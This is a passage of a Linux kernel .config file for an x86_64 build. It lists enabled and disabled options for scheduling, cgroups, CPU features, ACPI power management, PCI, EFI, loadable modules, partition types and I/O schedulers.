CONFIG_NO_HZ_COMMON=y
# CONFIG_HZ_PERIODIC is not set
CONFIG_NO_HZ_IDLE=y
# CONFIG_NO_HZ_FULL is not set
CONFIG_NO_HZ=y
CONFIG_HIGH_RES_TIMERS=y
# CONFIG_PREEMPT_NONE is not set
CONFIG_PREEMPT_VOLUNTARY=y
# CONFIG_PREEMPT is not set

#
# CPU/Task time and stats accounting
#
CONFIG_TICK_CPU_ACCOUNTING=y
# CONFIG_VIRT_CPU_ACCOUNTING_GEN is not set
# CONFIG_IRQ_TIME_ACCOUNTING is not set
CONFIG_BSD_PROCESS_ACCT=y
# CONFIG_BSD_PROCESS_ACCT_V3 is not set
CONFIG_TASKSTATS=y
CONFIG_TASK_DELAY_ACCT=y
CONFIG_TASK_XACCT=y
CONFIG_TASK_IO_ACCOUNTING=y
CONFIG_CPU_ISOLATION=y

#
# RCU Subsystem
#
CONFIG_TREE_RCU=y
# CONFIG_RCU_EXPERT is not set
CONFIG_SRCU=y
CONFIG_TREE_SRCU=y
CONFIG_RCU_STALL_COMMON=y
CONFIG_RCU_NEED_SEGCBLIST=y
CONFIG_BUILD_BIN2C=y
CONFIG_IKCONFIG=y
CONFIG_IKCONFIG_PROC=y
CONFIG_LOG_BUF_SHIFT=18
CONFIG_LOG_CPU_MAX_BUF_SHIFT=12
CONFIG_PRINTK_SAFE_LOG_BUF_SHIFT=13
CONFIG_HAVE_UNSTABLE_SCHED_CLOCK=y
CONFIG_ARCH_SUPPORTS_NUMA_BALANCING=y
CONFIG_ARCH_WANT_BATCHED_UNMAP_TLB_FLUSH=y
CONFIG_ARCH_SUPPORTS_INT128=y
# CONFIG_NUMA_BALANCING is not set
CONFIG_CGROUPS=y
# CONFIG_MEMCG is not set
# CONFIG_BLK_CGROUP is not set
CONFIG_CGROUP_SCHED=y
CONFIG_FAIR_GROUP_SCHED=y
# CONFIG_CFS_BANDWIDTH is not set
# CONFIG_RT_GROUP_SCHED is not set
# CONFIG_CGROUP_PIDS is not set
# CONFIG_CGROUP_RDMA is not set
CONFIG_CGROUP_FREEZER=y
# CONFIG_CGROUP_HUGETLB is not set
CONFIG_CPUSETS=y
CONFIG_PROC_PID_CPUSET=y
# CONFIG_CGROUP_DEVICE is not set
CONFIG_CGROUP_CPUACCT=y
# CONFIG_CGROUP_PERF is not set
# CONFIG_CGROUP_DEBUG is not set
CONFIG_NAMESPACES=y
CONFIG_UTS_NS=y
CONFIG_IPC_NS=y
# CONFIG_USER_NS is not set
CONFIG_PID_NS=y
CONFIG_NET_NS=y
# CONFIG_CHECKPOINT_RESTORE is not set
# CONFIG_SCHED_AUTOGROUP is not set
# CONFIG_SYSFS_DEPRECATED is not set
CONFIG_RELAY=y
CONFIG_BLK_DEV_INITRD=y
CONFIG_INITRAMFS_SOURCE=""
CONFIG_RD_GZIP=y
CONFIG_RD_BZIP2=y
CONFIG_RD_LZMA=y
CONFIG_RD_XZ=y
CONFIG_RD_LZO=y
CONFIG_RD_LZ4=y
CONFIG_CC_OPTIMIZE_FOR_PERFORMANCE=y
# CONFIG_CC_OPTIMIZE_FOR_SIZE is not set
CONFIG_SYSCTL=y
CONFIG_ANON_INODES=y
CONFIG_HAVE_UID16=y
CONFIG_SYSCTL_EXCEPTION_TRACE=y
CONFIG_HAVE_PCSPKR_PLATFORM=y
CONFIG_BPF=y
# CONFIG_EXPERT is not set
CONFIG_UID16=y
CONFIG_MULTIUSER=y
CONFIG_SGETMASK_SYSCALL=y
CONFIG_SYSFS_SYSCALL=y
CONFIG_FHANDLE=y
CONFIG_POSIX_TIMERS=y
CONFIG_PRINTK=y
CONFIG_PRINTK_NMI=y
CONFIG_BUG=y
CONFIG_ELF_CORE=y
CONFIG_PCSPKR_PLATFORM=y
CONFIG_BASE_FULL=y
CONFIG_FUTEX=y
CONFIG_FUTEX_PI=y
CONFIG_EPOLL=y
CONFIG_SIGNALFD=y
CONFIG_TIMERFD=y
CONFIG_EVENTFD=y
CONFIG_SHMEM=y
CONFIG_AIO=y
CONFIG_ADVISE_SYSCALLS=y
CONFIG_MEMBARRIER=y
CONFIG_KALLSYMS=y
# CONFIG_KALLSYMS_ALL is not set
CONFIG_KALLSYMS_ABSOLUTE_PERCPU=y
CONFIG_KALLSYMS_BASE_RELATIVE=y
# CONFIG_BPF_SYSCALL is not set
# CONFIG_USERFAULTFD is not set
CONFIG_ARCH_HAS_MEMBARRIER_SYNC_CORE=y
CONFIG_RSEQ=y
# CONFIG_EMBEDDED is not set
CONFIG_HAVE_PERF_EVENTS=y

#
# Kernel Performance Events And Counters
#
CONFIG_PERF_EVENTS=y
# CONFIG_DEBUG_PERF_USE_VMALLOC is not set
CONFIG_VM_EVENT_COUNTERS=y
CONFIG_SLUB_DEBUG=y
# CONFIG_COMPAT_BRK is not set
# CONFIG_SLAB is not set
CONFIG_SLUB=y
CONFIG_SLAB_MERGE_DEFAULT=y
# CONFIG_SLAB_FREELIST_RANDOM is not set
# CONFIG_SLAB_FREELIST_HARDENED is not set
CONFIG_SLUB_CPU_PARTIAL=y
CONFIG_SYSTEM_DATA_VERIFICATION=y
CONFIG_PROFILING=y
CONFIG_TRACEPOINTS=y
CONFIG_64BIT=y
CONFIG_X86_64=y
CONFIG_X86=y
CONFIG_INSTRUCTION_DECODER=y
CONFIG_OUTPUT_FORMAT="elf64-x86-64"
CONFIG_ARCH_DEFCONFIG="arch/x86/configs/x86_64_defconfig"
CONFIG_LOCKDEP_SUPPORT=y
CONFIG_STACKTRACE_SUPPORT=y
CONFIG_MMU=y
CONFIG_ARCH_MMAP_RND_BITS_MIN=28
CONFIG_ARCH_MMAP_RND_BITS_MAX=32
CONFIG_ARCH_MMAP_RND_COMPAT_BITS_MIN=8
CONFIG_ARCH_MMAP_RND_COMPAT_BITS_MAX=16
CONFIG_GENERIC_ISA_DMA=y
CONFIG_GENERIC_BUG=y
CONFIG_GENERIC_BUG_RELATIVE_POINTERS=y
CONFIG_GENERIC_HWEIGHT=y
CONFIG_ARCH_MAY_HAVE_PC_FDC=y
CONFIG_RWSEM_XCHGADD_ALGORITHM=y
CONFIG_GENERIC_CALIBRATE_DELAY=y
CONFIG_ARCH_HAS_CPU_RELAX=y
CONFIG_ARCH_HAS_CACHE_LINE_SIZE=y
CONFIG_ARCH_HAS_FILTER_PGPROT=y
CONFIG_HAVE_SETUP_PER_CPU_AREA=y
CONFIG_NEED_PER_CPU_EMBED_FIRST_CHUNK=y
CONFIG_NEED_PER_CPU_PAGE_FIRST_CHUNK=y
CONFIG_ARCH_HIBERNATION_POSSIBLE=y
CONFIG_ARCH_SUSPEND_POSSIBLE=y
CONFIG_ARCH_WANT_HUGE_PMD_SHARE=y
CONFIG_ARCH_WANT_GENERAL_HUGETLB=y
CONFIG_ZONE_DMA32=y
CONFIG_AUDIT_ARCH=y
CONFIG_ARCH_SUPPORTS_OPTIMIZED_INLINING=y
CONFIG_ARCH_SUPPORTS_DEBUG_PAGEALLOC=y
CONFIG_KASAN_SHADOW_OFFSET=0xdffffc0000000000
CONFIG_HAVE_INTEL_TXT=y
CONFIG_X86_64_SMP=y
CONFIG_ARCH_SUPPORTS_UPROBES=y
CONFIG_FIX_EARLYCON_MEM=y
CONFIG_PGTABLE_LEVELS=4
CONFIG_CC_HAS_SANE_STACKPROTECTOR=y

#
# Processor type and features
#
CONFIG_ZONE_DMA=y
CONFIG_SMP=y
CONFIG_X86_FEATURE_NAMES=y
CONFIG_X86_MPPARSE=y
# CONFIG_GOLDFISH is not set
# CONFIG_RETPOLINE is not set
# CONFIG_INTEL_RDT is not set
CONFIG_X86_EXTENDED_PLATFORM=y
# CONFIG_X86_VSMP is not set
# CONFIG_X86_GOLDFISH is not set
# CONFIG_X86_INTEL_MID is not set
# CONFIG_X86_INTEL_LPSS is not set
# CONFIG_X86_AMD_PLATFORM_DEVICE is not set
CONFIG_IOSF_MBI=y
# CONFIG_IOSF_MBI_DEBUG is not set
CONFIG_X86_SUPPORTS_MEMORY_FAILURE=y
CONFIG_SCHED_OMIT_FRAME_POINTER=y
# CONFIG_HYPERVISOR_GUEST is not set
CONFIG_NO_BOOTMEM=y
# CONFIG_MK8 is not set
# CONFIG_MPSC is not set
# CONFIG_MCORE2 is not set
# CONFIG_MATOM is not set
CONFIG_GENERIC_CPU=y
CONFIG_X86_INTERNODE_CACHE_SHIFT=6
CONFIG_X86_L1_CACHE_SHIFT=6
CONFIG_X86_TSC=y
CONFIG_X86_CMPXCHG64=y
CONFIG_X86_CMOV=y
CONFIG_X86_MINIMUM_CPU_FAMILY=64
CONFIG_X86_DEBUGCTLMSR=y
CONFIG_CPU_SUP_INTEL=y
CONFIG_CPU_SUP_AMD=y
CONFIG_CPU_SUP_CENTAUR=y
CONFIG_HPET_TIMER=y
CONFIG_HPET_EMULATE_RTC=y
CONFIG_DMI=y
# CONFIG_GART_IOMMU is not set
CONFIG_CALGARY_IOMMU=y
CONFIG_CALGARY_IOMMU_ENABLED_BY_DEFAULT=y
# CONFIG_MAXSMP is not set
CONFIG_NR_CPUS_RANGE_BEGIN=2
CONFIG_NR_CPUS_RANGE_END=512
CONFIG_NR_CPUS_DEFAULT=64
CONFIG_NR_CPUS=64
CONFIG_SCHED_SMT=y
CONFIG_SCHED_MC=y
CONFIG_SCHED_MC_PRIO=y
CONFIG_X86_LOCAL_APIC=y
CONFIG_X86_IO_APIC=y
CONFIG_X86_REROUTE_FOR_BROKEN_BOOT_IRQS=y
CONFIG_X86_MCE=y
# CONFIG_X86_MCELOG_LEGACY is not set
CONFIG_X86_MCE_INTEL=y
CONFIG_X86_MCE_AMD=y
CONFIG_X86_MCE_THRESHOLD=y
# CONFIG_X86_MCE_INJECT is not set
CONFIG_X86_THERMAL_VECTOR=y

#
# Performance monitoring
#
CONFIG_PERF_EVENTS_INTEL_UNCORE=y
CONFIG_PERF_EVENTS_INTEL_RAPL=y
CONFIG_PERF_EVENTS_INTEL_CSTATE=y
# CONFIG_PERF_EVENTS_AMD_POWER is not set
CONFIG_X86_16BIT=y
CONFIG_X86_ESPFIX64=y
CONFIG_X86_VSYSCALL_EMULATION=y
# CONFIG_I8K is not set
CONFIG_MICROCODE=y
CONFIG_MICROCODE_INTEL=y
CONFIG_MICROCODE_AMD=y
CONFIG_MICROCODE_OLD_INTERFACE=y
CONFIG_X86_MSR=y
CONFIG_X86_CPUID=y
# CONFIG_X86_5LEVEL is not set
CONFIG_X86_DIRECT_GBPAGES=y
CONFIG_ARCH_HAS_MEM_ENCRYPT=y
# CONFIG_AMD_MEM_ENCRYPT is not set
CONFIG_NUMA=y
CONFIG_AMD_NUMA=y
CONFIG_X86_64_ACPI_NUMA=y
CONFIG_NODES_SPAN_OTHER_NODES=y
# CONFIG_NUMA_EMU is not set
CONFIG_NODES_SHIFT=6
CONFIG_ARCH_SPARSEMEM_ENABLE=y
CONFIG_ARCH_SPARSEMEM_DEFAULT=y
CONFIG_ARCH_SELECT_MEMORY_MODEL=y
CONFIG_ARCH_PROC_KCORE_TEXT=y
CONFIG_ILLEGAL_POINTER_VALUE=0xdead000000000000
# CONFIG_X86_PMEM_LEGACY is not set
CONFIG_X86_CHECK_BIOS_CORRUPTION=y
CONFIG_X86_BOOTPARAM_MEMORY_CORRUPTION_CHECK=y
CONFIG_X86_RESERVE_LOW=64
CONFIG_MTRR=y
# CONFIG_MTRR_SANITIZER is not set
CONFIG_X86_PAT=y
CONFIG_ARCH_USES_PG_UNCACHED=y
CONFIG_ARCH_RANDOM=y
CONFIG_X86_SMAP=y
CONFIG_X86_INTEL_UMIP=y
# CONFIG_X86_INTEL_MPX is not set
CONFIG_X86_INTEL_MEMORY_PROTECTION_KEYS=y
CONFIG_X86_INTEL_TSX_MODE_OFF=y
# CONFIG_X86_INTEL_TSX_MODE_ON is not set
# CONFIG_X86_INTEL_TSX_MODE_AUTO is not set
CONFIG_EFI=y
# CONFIG_EFI_STUB is not set
CONFIG_SECCOMP=y
# CONFIG_HZ_100 is not set
# CONFIG_HZ_250 is not set
# CONFIG_HZ_300 is not set
CONFIG_HZ_1000=y
CONFIG_HZ=1000
CONFIG_SCHED_HRTICK=y
CONFIG_KEXEC=y
# CONFIG_KEXEC_FILE is not set
CONFIG_CRASH_DUMP=y
# CONFIG_KEXEC_JUMP is not set
CONFIG_PHYSICAL_START=0x1000000
CONFIG_RELOCATABLE=y
CONFIG_RANDOMIZE_BASE=y
CONFIG_X86_NEED_RELOCS=y
CONFIG_PHYSICAL_ALIGN=0x200000
CONFIG_DYNAMIC_MEMORY_LAYOUT=y
CONFIG_RANDOMIZE_MEMORY=y
CONFIG_RANDOMIZE_MEMORY_PHYSICAL_PADDING=0x0
CONFIG_HOTPLUG_CPU=y
# CONFIG_BOOTPARAM_HOTPLUG_CPU0 is not set
# CONFIG_DEBUG_HOTPLUG_CPU0 is not set
# CONFIG_COMPAT_VDSO is not set
CONFIG_LEGACY_VSYSCALL_EMULATE=y
# CONFIG_LEGACY_VSYSCALL_NONE is not set
# CONFIG_CMDLINE_BOOL is not set
CONFIG_MODIFY_LDT_SYSCALL=y
CONFIG_HAVE_LIVEPATCH=y
CONFIG_ARCH_HAS_ADD_PAGES=y
CONFIG_ARCH_ENABLE_MEMORY_HOTPLUG=y
CONFIG_USE_PERCPU_NUMA_NODE_ID=y
CONFIG_ARCH_ENABLE_SPLIT_PMD_PTLOCK=y
# CONFIG_GDS_FORCE_MITIGATION is not set
CONFIG_ARCH_ENABLE_HUGEPAGE_MIGRATION=y

#
# Power management and ACPI options
#
CONFIG_ARCH_HIBERNATION_HEADER=y
CONFIG_SUSPEND=y
CONFIG_SUSPEND_FREEZER=y
CONFIG_HIBERNATE_CALLBACKS=y
CONFIG_HIBERNATION=y
CONFIG_PM_STD_PARTITION=""
CONFIG_PM_SLEEP=y
CONFIG_PM_SLEEP_SMP=y
# CONFIG_PM_AUTOSLEEP is not set
# CONFIG_PM_WAKELOCKS is not set
CONFIG_PM=y
CONFIG_PM_DEBUG=y
# CONFIG_PM_ADVANCED_DEBUG is not set
# CONFIG_PM_TEST_SUSPEND is not set
CONFIG_PM_SLEEP_DEBUG=y
CONFIG_PM_TRACE=y
CONFIG_PM_TRACE_RTC=y
CONFIG_PM_CLK=y
# CONFIG_WQ_POWER_EFFICIENT_DEFAULT is not set
CONFIG_ARCH_SUPPORTS_ACPI=y
CONFIG_ACPI=y
CONFIG_ACPI_LEGACY_TABLES_LOOKUP=y
CONFIG_ARCH_MIGHT_HAVE_ACPI_PDC=y
CONFIG_ACPI_SYSTEM_POWER_STATES_SUPPORT=y
# CONFIG_ACPI_DEBUGGER is not set
CONFIG_ACPI_SPCR_TABLE=y
CONFIG_ACPI_LPIT=y
CONFIG_ACPI_SLEEP=y
# CONFIG_ACPI_PROCFS_POWER is not set
CONFIG_ACPI_REV_OVERRIDE_POSSIBLE=y
# CONFIG_ACPI_EC_DEBUGFS is not set
CONFIG_ACPI_AC=y
CONFIG_ACPI_BATTERY=y
CONFIG_ACPI_BUTTON=y
CONFIG_ACPI_VIDEO=y
CONFIG_ACPI_FAN=y
# CONFIG_ACPI_TAD is not set
CONFIG_ACPI_DOCK=y
CONFIG_ACPI_CPU_FREQ_PSS=y
CONFIG_ACPI_PROCESSOR_CSTATE=y
CONFIG_ACPI_PROCESSOR_IDLE=y
CONFIG_ACPI_CPPC_LIB=y
CONFIG_ACPI_PROCESSOR=y
CONFIG_ACPI_HOTPLUG_CPU=y
# CONFIG_ACPI_PROCESSOR_AGGREGATOR is not set
CONFIG_ACPI_THERMAL=y
CONFIG_ACPI_NUMA=y
CONFIG_ARCH_HAS_ACPI_TABLE_UPGRADE=y
CONFIG_ACPI_TABLE_UPGRADE=y
# CONFIG_ACPI_DEBUG is not set
# CONFIG_ACPI_PCI_SLOT is not set
CONFIG_ACPI_CONTAINER=y
CONFIG_ACPI_HOTPLUG_IOAPIC=y
# CONFIG_ACPI_SBS is not set
# CONFIG_ACPI_HED is not set
# CONFIG_ACPI_CUSTOM_METHOD is not set
# CONFIG_ACPI_BGRT is not set
# CONFIG_ACPI_NFIT is not set
CONFIG_HAVE_ACPI_APEI=y
CONFIG_HAVE_ACPI_APEI_NMI=y
# CONFIG_ACPI_APEI is not set
# CONFIG_DPTF_POWER is not set
# CONFIG_ACPI_EXTLOG is not set
# CONFIG_PMIC_OPREGION is not set
# CONFIG_ACPI_CONFIGFS is not set
CONFIG_X86_PM_TIMER=y
# CONFIG_SFI is not set

#
# CPU Frequency scaling
#
CONFIG_CPU_FREQ=y
CONFIG_CPU_FREQ_GOV_ATTR_SET=y
CONFIG_CPU_FREQ_GOV_COMMON=y
# CONFIG_CPU_FREQ_STAT is not set
# CONFIG_CPU_FREQ_DEFAULT_GOV_PERFORMANCE is not set
# CONFIG_CPU_FREQ_DEFAULT_GOV_POWERSAVE is not set
CONFIG_CPU_FREQ_DEFAULT_GOV_USERSPACE=y
# CONFIG_CPU_FREQ_DEFAULT_GOV_ONDEMAND is not set
# CONFIG_CPU_FREQ_DEFAULT_GOV_CONSERVATIVE is not set
# CONFIG_CPU_FREQ_DEFAULT_GOV_SCHEDUTIL is not set
CONFIG_CPU_FREQ_GOV_PERFORMANCE=y
# CONFIG_CPU_FREQ_GOV_POWERSAVE is not set
CONFIG_CPU_FREQ_GOV_USERSPACE=y
CONFIG_CPU_FREQ_GOV_ONDEMAND=y
# CONFIG_CPU_FREQ_GOV_CONSERVATIVE is not set
# CONFIG_CPU_FREQ_GOV_SCHEDUTIL is not set

#
# CPU frequency scaling drivers
#
CONFIG_X86_INTEL_PSTATE=y
# CONFIG_X86_PCC_CPUFREQ is not set
CONFIG_X86_ACPI_CPUFREQ=y
CONFIG_X86_ACPI_CPUFREQ_CPB=y
# CONFIG_X86_POWERNOW_K8 is not set
# CONFIG_X86_AMD_FREQ_SENSITIVITY is not set
# CONFIG_X86_SPEEDSTEP_CENTRINO is not set
# CONFIG_X86_P4_CLOCKMOD is not set

#
# shared options
#

#
# CPU Idle
#
CONFIG_CPU_IDLE=y
# CONFIG_CPU_IDLE_GOV_LADDER is not set
CONFIG_CPU_IDLE_GOV_MENU=y
# CONFIG_INTEL_IDLE is not set

#
# Bus options (PCI etc.)
#
CONFIG_PCI=y
CONFIG_PCI_DIRECT=y
CONFIG_PCI_MMCONFIG=y
CONFIG_PCI_DOMAINS=y
CONFIG_MMCONF_FAM10H=y
CONFIG_PCIEPORTBUS=y
# CONFIG_HOTPLUG_PCI_PCIE is not set
CONFIG_PCIEAER=y
# CONFIG_PCIEAER_INJECT is not set
# CONFIG_PCIE_ECRC is not set
CONFIG_PCIEASPM=y
# CONFIG_PCIEASPM_DEBUG is not set
CONFIG_PCIEASPM_DEFAULT=y
# CONFIG_PCIEASPM_POWERSAVE is not set
# CONFIG_PCIEASPM_POWER_SUPERSAVE is not set
# CONFIG_PCIEASPM_PERFORMANCE is not set
CONFIG_PCIE_PME=y
# CONFIG_PCIE_DPC is not set
# CONFIG_PCIE_PTM is not set
CONFIG_PCI_MSI=y
CONFIG_PCI_MSI_IRQ_DOMAIN=y
CONFIG_PCI_QUIRKS=y
# CONFIG_PCI_DEBUG is not set
# CONFIG_PCI_STUB is not set
CONFIG_PCI_ATS=y
CONFIG_PCI_LOCKLESS_CONFIG=y
# CONFIG_PCI_IOV is not set
CONFIG_PCI_PRI=y
CONFIG_PCI_PASID=y
CONFIG_PCI_LABEL=y
CONFIG_HOTPLUG_PCI=y
# CONFIG_HOTPLUG_PCI_ACPI is not set
# CONFIG_HOTPLUG_PCI_CPCI is not set
# CONFIG_HOTPLUG_PCI_SHPC is not set

#
# PCI controller drivers
#

#
# Cadence PCIe controllers support
#
# CONFIG_VMD is not set

#
# DesignWare PCI Core Support
#
# CONFIG_PCIE_DW_PLAT_HOST is not set

#
# PCI Endpoint
#
# CONFIG_PCI_ENDPOINT is not set

#
# PCI switch controller drivers
#
# CONFIG_PCI_SW_SWITCHTEC is not set
CONFIG_ISA_DMA_API=y
CONFIG_AMD_NB=y
CONFIG_PCCARD=y
CONFIG_PCMCIA=y
CONFIG_PCMCIA_LOAD_CIS=y
CONFIG_CARDBUS=y

#
# PC-card bridges
#
CONFIG_YENTA=y
CONFIG_YENTA_O2=y
CONFIG_YENTA_RICOH=y
CONFIG_YENTA_TI=y
CONFIG_YENTA_ENE_TUNE=y
CONFIG_YENTA_TOSHIBA=y
# CONFIG_PD6729 is not set
# CONFIG_I82092 is not set
CONFIG_PCCARD_NONSTATIC=y
# CONFIG_RAPIDIO is not set
# CONFIG_X86_SYSFB is not set

#
# Binary Emulations
#
CONFIG_IA32_EMULATION=y
# CONFIG_IA32_AOUT is not set
# CONFIG_X86_X32 is not set
CONFIG_COMPAT_32=y
CONFIG_COMPAT=y
CONFIG_COMPAT_FOR_U64_ALIGNMENT=y
CONFIG_SYSVIPC_COMPAT=y
CONFIG_X86_DEV_DMA_OPS=y
CONFIG_HAVE_GENERIC_GUP=y

#
# Firmware Drivers
#
# CONFIG_EDD is not set
CONFIG_FIRMWARE_MEMMAP=y
# CONFIG_DELL_RBU is not set
# CONFIG_DCDBAS is not set
CONFIG_DMIID=y
# CONFIG_DMI_SYSFS is not set
CONFIG_DMI_SCAN_MACHINE_NON_EFI_FALLBACK=y
# CONFIG_FW_CFG_SYSFS is not set
# CONFIG_GOOGLE_FIRMWARE is not set

#
# EFI (Extensible Firmware Interface) Support
#
CONFIG_EFI_VARS=y
CONFIG_EFI_ESRT=y
CONFIG_EFI_RUNTIME_MAP=y
# CONFIG_EFI_FAKE_MEMMAP is not set
CONFIG_EFI_RUNTIME_WRAPPERS=y
# CONFIG_EFI_BOOTLOADER_CONTROL is not set
# CONFIG_EFI_CAPSULE_LOADER is not set
# CONFIG_EFI_TEST is not set
CONFIG_EFI_CUSTOM_SSDT_OVERLAYS=y

#
# Tegra firmware driver
#
CONFIG_HAVE_KVM=y
CONFIG_VIRTUALIZATION=y
# CONFIG_KVM is not set
# CONFIG_VHOST_NET is not set
# CONFIG_VHOST_CROSS_ENDIAN_LEGACY is not set

#
# General architecture-dependent options
#
CONFIG_CRASH_CORE=y
CONFIG_KEXEC_CORE=y
CONFIG_HOTPLUG_SMT=y
# CONFIG_OPROFILE is not set
CONFIG_HAVE_OPROFILE=y
CONFIG_OPROFILE_NMI_TIMER=y
CONFIG_KPROBES=y
CONFIG_JUMP_LABEL=y
# CONFIG_STATIC_KEYS_SELFTEST is not set
CONFIG_OPTPROBES=y
CONFIG_UPROBES=y
CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS=y
CONFIG_ARCH_USE_BUILTIN_BSWAP=y
CONFIG_KRETPROBES=y
CONFIG_HAVE_IOREMAP_PROT=y
CONFIG_HAVE_KPROBES=y
CONFIG_HAVE_KRETPROBES=y
CONFIG_HAVE_OPTPROBES=y
CONFIG_HAVE_KPROBES_ON_FTRACE=y
CONFIG_HAVE_FUNCTION_ERROR_INJECTION=y
CONFIG_HAVE_NMI=y
CONFIG_HAVE_ARCH_TRACEHOOK=y
CONFIG_HAVE_DMA_CONTIGUOUS=y
CONFIG_GENERIC_SMP_IDLE_THREAD=y
CONFIG_ARCH_HAS_FORTIFY_SOURCE=y
CONFIG_ARCH_HAS_SET_MEMORY=y
CONFIG_ARCH_HAS_CPU_FINALIZE_INIT=y
CONFIG_HAVE_ARCH_THREAD_STRUCT_WHITELIST=y
CONFIG_ARCH_WANTS_DYNAMIC_TASK_STRUCT=y
CONFIG_HAVE_REGS_AND_STACK_ACCESS_API=y
CONFIG_HAVE_RSEQ=y
CONFIG_HAVE_CLK=y
CONFIG_HAVE_HW_BREAKPOINT=y
CONFIG_HAVE_MIXED_BREAKPOINTS_REGS=y
CONFIG_HAVE_USER_RETURN_NOTIFIER=y
CONFIG_HAVE_PERF_EVENTS_NMI=y
CONFIG_HAVE_HARDLOCKUP_DETECTOR_PERF=y
CONFIG_HAVE_PERF_REGS=y
CONFIG_HAVE_PERF_USER_STACK_DUMP=y
CONFIG_HAVE_ARCH_JUMP_LABEL=y
CONFIG_ARCH_HAVE_NMI_SAFE_CMPXCHG=y
CONFIG_HAVE_ALIGNED_STRUCT_PAGE=y
CONFIG_HAVE_CMPXCHG_LOCAL=y
CONFIG_HAVE_CMPXCHG_DOUBLE=y
CONFIG_ARCH_WANT_COMPAT_IPC_PARSE_VERSION=y
CONFIG_ARCH_WANT_OLD_COMPAT_IPC=y
CONFIG_HAVE_ARCH_SECCOMP_FILTER=y
CONFIG_SECCOMP_FILTER=y
CONFIG_HAVE_STACKPROTECTOR=y
CONFIG_CC_HAS_STACKPROTECTOR_NONE=y
CONFIG_STACKPROTECTOR=y
CONFIG_STACKPROTECTOR_STRONG=y
CONFIG_HAVE_ARCH_WITHIN_STACK_FRAMES=y
CONFIG_HAVE_CONTEXT_TRACKING=y
CONFIG_HAVE_VIRT_CPU_ACCOUNTING_GEN=y
CONFIG_HAVE_IRQ_TIME_ACCOUNTING=y
CONFIG_HAVE_ARCH_TRANSPARENT_HUGEPAGE=y
CONFIG_HAVE_ARCH_TRANSPARENT_HUGEPAGE_PUD=y
CONFIG_HAVE_ARCH_HUGE_VMAP=y
CONFIG_HAVE_ARCH_SOFT_DIRTY=y
CONFIG_HAVE_MOD_ARCH_SPECIFIC=y
CONFIG_MODULES_USE_ELF_RELA=y
CONFIG_HAVE_IRQ_EXIT_ON_IRQ_STACK=y
CONFIG_ARCH_HAS_ELF_RANDOMIZE=y
CONFIG_HAVE_ARCH_MMAP_RND_BITS=y
CONFIG_HAVE_EXIT_THREAD=y
CONFIG_ARCH_MMAP_RND_BITS=28
CONFIG_HAVE_ARCH_MMAP_RND_COMPAT_BITS=y
CONFIG_ARCH_MMAP_RND_COMPAT_BITS=8
CONFIG_HAVE_ARCH_COMPAT_MMAP_BASES=y
CONFIG_HAVE_COPY_THREAD_TLS=y
CONFIG_HAVE_STACK_VALIDATION=y
CONFIG_OLD_SIGSUSPEND3=y
CONFIG_COMPAT_OLD_SIGACTION=y
CONFIG_COMPAT_32BIT_TIME=y
CONFIG_HAVE_ARCH_VMAP_STACK=y
CONFIG_ARCH_HAS_STRICT_KERNEL_RWX=y
CONFIG_STRICT_KERNEL_RWX=y
CONFIG_ARCH_HAS_STRICT_MODULE_RWX=y
CONFIG_STRICT_MODULE_RWX=y
CONFIG_ARCH_HAS_REFCOUNT=y
# CONFIG_REFCOUNT_FULL is not set
CONFIG_HAVE_ARCH_PREL32_RELOCATIONS=y
CONFIG_ARCH_USE_MEMREMAP_PROT=y

#
# GCOV-based kernel profiling
#
# CONFIG_GCOV_KERNEL is not set
CONFIG_ARCH_HAS_GCOV_PROFILE_ALL=y
CONFIG_PLUGIN_HOSTCC=""
CONFIG_HAVE_GCC_PLUGINS=y
CONFIG_RT_MUTEXES=y
CONFIG_BASE_SMALL=0
CONFIG_MODULES=y
# CONFIG_MODULE_FORCE_LOAD is not set
CONFIG_MODULE_UNLOAD=y
CONFIG_MODULE_FORCE_UNLOAD=y
# CONFIG_MODVERSIONS is not set
# CONFIG_MODULE_SRCVERSION_ALL is not set
# CONFIG_MODULE_SIG is not set
# CONFIG_MODULE_COMPRESS is not set
# CONFIG_TRIM_UNUSED_KSYMS is not set
CONFIG_MODULES_TREE_LOOKUP=y
CONFIG_BLOCK=y
CONFIG_BLK_SCSI_REQUEST=y
CONFIG_BLK_DEV_BSG=y
# CONFIG_BLK_DEV_BSGLIB is not set
# CONFIG_BLK_DEV_INTEGRITY is not set
# CONFIG_BLK_DEV_ZONED is not set
# CONFIG_BLK_CMDLINE_PARSER is not set
# CONFIG_BLK_WBT is not set
CONFIG_BLK_DEBUG_FS=y
# CONFIG_BLK_SED_OPAL is not set

#
# Partition Types
#
CONFIG_PARTITION_ADVANCED=y
# CONFIG_ACORN_PARTITION is not set
# CONFIG_AIX_PARTITION is not set
CONFIG_OSF_PARTITION=y
CONFIG_AMIGA_PARTITION=y
# CONFIG_ATARI_PARTITION is not set
CONFIG_MAC_PARTITION=y
CONFIG_MSDOS_PARTITION=y
CONFIG_BSD_DISKLABEL=y
CONFIG_MINIX_SUBPARTITION=y
CONFIG_SOLARIS_X86_PARTITION=y
CONFIG_UNIXWARE_DISKLABEL=y
# CONFIG_LDM_PARTITION is not set
CONFIG_SGI_PARTITION=y
# CONFIG_ULTRIX_PARTITION is not set
CONFIG_SUN_PARTITION=y
CONFIG_KARMA_PARTITION=y
CONFIG_EFI_PARTITION=y
# CONFIG_SYSV68_PARTITION is not set
# CONFIG_CMDLINE_PARTITION is not set
CONFIG_BLOCK_COMPAT=y
CONFIG_BLK_MQ_PCI=y

#
# IO Schedulers
#
CONFIG_IOSCHED_NOOP=y
CONFIG_IOSCHED_DEADLINE=y
CONFIG_IOSCHED_CFQ=y
# CONFIG_DEFAULT_DEADLINE is not set
CONFIG_DEFAULT_CFQ=y
# CONFIG_DEFAULT_NOOP is not set
CONFIG_DEFAULT_IOSCHED="cfq"
CONFIG_MQ_IOSCHED_DEADLINE=y
CONFIG_MQ_IOSCHED_KYBER=y
# CONFIG_IOSCHED_BFQ is not set
CONFIG_ASN1=y
CONFIG_INLINE_SPIN_UNLOCK_IRQ=y
CONFIG_INLINE_READ_UNLOCK=y
CONFIG_INLINE_READ_UNLOCK_IRQ=y
CONFIG_INLINE_WRITE_UNLOCK=y
CONFIG_INLINE_WRITE_UNLOCK_IRQ=y
CONFIG_ARCH_SUPPORTS_ATOMIC_RMW=y
CONFIG_MUTEX_SPIN_ON_OWNER=y
CONFIG_RWSEM_SPIN_ON_OWNER=y
CONFIG_LOCK_SPIN_ON_OWNER=y
CONFIG_ARCH_USE_QUEUED_SPINLOCKS=y
CONFIG_QUEUED_SPINLOCKS=y
CONFIG_ARCH_USE_QUEUED_RWLOCKS=y
